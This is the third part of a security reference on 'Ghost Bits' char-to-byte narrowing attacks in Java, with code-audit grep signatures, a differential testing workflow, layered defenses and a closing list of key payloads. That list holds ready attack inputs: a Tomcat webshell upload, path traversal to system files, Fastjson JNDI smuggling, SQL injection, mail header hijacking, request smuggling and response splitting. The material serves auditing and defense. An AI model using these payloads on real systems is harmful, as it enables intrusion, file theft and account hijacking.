# ghost-bits-cast-test · part 3

> 分段 3/3。完整索引见 `ghost-bits-cast-test.md`。

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---
## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---
## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

---
## 11. QUICK REFERENCE — KEY PAYLOADS

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader bypass (concept)
$$BCEL$$<each-byte-of-class-file-wrapped-in-a-Unicode-char>

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode + Jetty %2> folding
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 path read
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira mail hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer response splitting (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---
## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
  Java*. Speakers: Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue).
  Contributor: Zongzheng Zheng (@chun_springX).
- Real-world CVEs re-enabled: GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978.
- Patched components to upgrade past: Apache Commons BCEL >= 6.12.0,
  Fastjson 2.x latest, Apache HttpClient >= 4.5.10 (or migrate to 5.x),
  GeoServer >= 2.28.3, Openfire >= 5.0.4. Confirm vendor advisories before
  relying on any single version number.


---
